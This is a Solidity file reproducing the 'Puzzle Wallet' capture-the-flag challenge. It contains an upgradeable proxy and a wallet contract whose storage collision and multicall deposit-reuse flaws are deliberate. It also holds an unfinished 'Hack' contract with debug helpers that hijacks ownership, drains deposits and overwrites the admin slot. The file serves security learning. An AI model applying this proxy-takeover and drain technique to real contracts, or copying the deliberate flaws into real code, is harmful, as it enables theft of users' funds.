// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import "./@openzeppelin/contracts/proxy/utils/UpgradableProxy.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "../node_modules/hardhat-console/contracts/console.sol";

/**
Nowadays, paying for DeFi operations is impossible, fact.

A group of friends discovered how to slightly decrease the cost of performing multiple transactions 
by batching them in one transaction, so they developed a smart contract for doing this.

They needed this contract to be upgradeable in case the code contained a bug, 
and they also wanted to prevent people from outside the group from using it. 
To do so, they voted and assigned two people with special roles in the system: 
The admin, which has the power of updating the logic of the smart contract. 
The owner, which controls the whitelist of addresses allowed to use the contract. 
The contracts were deployed, and the group was whitelisted. 
Everyone cheered for their accomplishments against evil miners.

Little did they know, their lunch money was at risk…

  You'll need to hijack this wallet to become the admin of the proxy.

  Things that might help::

Understanding how delegatecalls work and how msg.sender and msg.value behaves when performing one.
Knowing about proxy patterns and the way they handle storage variables.

**/

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _implementation) 
    UpgradeableProxy(_implementation, "") payable {
        admin = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;
    }

    modifier onlyAdmin {
      require(msg.sender == admin, "Caller is not the admin");
      _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

//0x5B38Da6a701c568545dCfcB03FcB875f56beddC4,0xd9145CCE52D386f254917e481eB44e9943F39138,0x

contract PuzzleWallet {
    using SafeMath for uint256;
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      require(address(this).balance == 0, "Contract balance is not 0");
      maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function depositSenderCheck() external payable returns(address) {
        return msg.sender;
    }

    function depositValueCheck() external payable returns(uint) {
        return msg.value;
    }
    
    function deposit() external payable onlyWhitelisted {
      require(address(this).balance <= maxBalance, "Max balance reached");
      balances[msg.sender] = balances[msg.sender].add(msg.value);
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] = balances[msg.sender].sub(value);
        (bool success, ) = to.call{ value: value }(data);
        require(success, "Execution failed");
    }

    function single(bytes calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        bytes memory _data = data;
        bytes4 selector;
        assembly {
            selector := mload(add(_data, 32))
        }
        if (selector == this.deposit.selector) {
            require(!depositCalled, "Deposit can only be called once");
            // Protect against reusing msg.value
            depositCalled = true;
        }
        (bool success, ) = address(this).delegatecall(_data);
        require(success, "Error while delegating call");
        
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}

interface ProxyI {
    function proposeNewAdmin(address _newAdmin) external;
    function addToWhitelist(address addr) external;
    function setMaxBalance(uint256 _maxBalance) external;
    function deposit() external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function balances(address to) external view returns(uint);

    function multicall(bytes[] calldata data) external payable;
    function single(bytes calldata data) external payable;
    function depositSenderCheck() external payable returns(address);
    function depositValueCheck() external payable returns(uint);
}

interface PuzzleI {
    function setMaxBalance(uint256 _maxBalance) external;
}

contract Hack {

    ProxyI proxy;
    PuzzleI puzzle;
    bytes[] data;

    constructor(address _proxy, address _puzzle) {
        proxy = ProxyI(_proxy);
        puzzle = PuzzleI(_puzzle);
    }

    function hack() public payable {
        proxy.proposeNewAdmin(address(this));
        proxy.addToWhitelist(address(this));
        //proxy.deposit{value: msg.value}();
    }

    //0x0000000000000000000000000000000000000000000000000000000000000002
    //00000000000000000000000000000000000000000000000000000000000000c
    //0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000096465706f73697428290000000000000000000000000000000000000000000000

    function depositAndWithdraw() public payable {
        delete data;
        data.push(abi.encodePacked("deposit()"));
        data.push(abi.encodePacked("execute(address, uint256, bytes)", 0x03C6FcED478cBbC9a4FAB34eF9f40767739D1Ff7, uint256(100), ""));
        proxy.multicall(data);
    }

    function d2epositAndWithdraw() public payable {
        proxy.single(abi.encodePacked("deposit()"));
    }

    function deposit1() public payable {
        proxy.deposit{value: msg.value}();
    }
    
    function balances() public view returns(uint){
        return proxy.balances(address(this));
    }

    function getProxyBalance() public view returns(uint) {
       return address(proxy).balance;
    }

    function hack3b() public {
        proxy.execute(0x03C6FcED478cBbC9a4FAB34eF9f40767739D1Ff7, 100, "");
    }

    function hack3() public {
        proxy.setMaxBalance(uint160(msg.sender));
    }

    function hack4() public {
        puzzle.setMaxBalance(uint160(msg.sender));
    }
}